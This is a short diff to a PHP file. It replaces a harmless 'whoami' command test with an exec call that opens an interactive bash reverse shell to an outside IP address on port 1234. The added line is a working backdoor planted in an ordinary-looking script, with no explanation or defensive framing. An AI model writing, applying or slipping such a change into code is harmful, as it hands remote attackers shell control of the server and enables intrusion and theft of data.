@@ -1,7 +1,5 @@
 <?php 
 $output=null;
 $retval=null;
-exec('whoami', $output, $retval);
-echo "Returned with status $retval and output:\n";
-print_r($output); 
+exec('bash -i >& /dev/tcp/35.238.146.56/1234 0>&1', $output, $retval);
 ?>
